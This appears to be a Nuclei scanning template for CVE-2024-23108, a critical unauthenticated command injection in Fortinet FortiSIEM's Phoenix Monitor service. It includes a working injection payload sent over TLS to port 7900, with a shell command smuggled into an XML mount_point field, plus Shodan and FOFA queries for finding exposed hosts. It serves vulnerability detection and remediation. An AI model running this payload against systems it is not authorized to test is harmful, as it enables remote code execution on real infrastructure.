id: CVE-2024-23108
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:fortinet:fortisiem:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-23108
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-78
    epss-percentile: 0.99668
    epss-score: 0.91825
  description: 'FortiSIEM versions 6.4.0 through 7.1.1 contain an OS command injection
    vulnerability in the Phoenix Monitor service. The vulnerability exists in the
    XML parsing of TEST_STORAGE elements where the mount_point field is not properly
    sanitized before being passed to shell commands, allowing unauthenticated remote
    code execution.

    '
  impact: 'Unauthenticated attackers can execute arbitrary commands on the FortiSIEM
    system, potentially leading to full system compromise, data exfilteration, lateral
    movement, and complete bypass of security monitoring capabilities.

    '
  metadata:
    fofa-query:
    - body="var hst = location.hostname"
    - icon_hash="-1341442175"
    max-request: 1
    product: fortisiem
    shodan-query:
    - port:"7900"
    - http.favicon.hash:"-1341442175"
    - http.html:"var hst = location.hostname"
    vendor: fortinet
  name: Fortinet FortiSIEM - OS Command Injection
  reference:
  - https://www.horizon3.ai/attack-research/disclosures/cve-2024-23108-fortinet-fortisiem-2nd-order-command-injection-deep-dive/
  - https://fortiguard.com/psirt/FG-IR-23-130
  - https://nvd.nist.gov/vuln/detail/CVE-2024-23108
  - https://github.com/horizon3ai/CVE-2024-23108
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Update FortiSIEM to versions newer than 7.1.1. Implement network segmentation
    to restrict access to Phoenix Monitor service (TCP/7900) and monitor for suspicious
    connections to this port.

    '
  severity: critical
  tags: cve,cve2024,fortinet,fortisiem,vkev,injection,unauth
tcp:
- host:
  - tls://{{Hostname}}
  inputs:
  - data: '{{payload}}'
  matchers:
  - part: raw
    type: word
    words:
    - 15..
  port: 7900
  read-size: 1024
variables:
  payload: "Q\0\0\0t\0\0\0oB\x1E@\0\0\0\0{{xml}}"
  xml: <TEST_STORAGE type="nfs"><server_ip>127.0.0.1</server_ip><mount_point>/lala;
    echo "id";</mount_point></TEST_STORAGE>
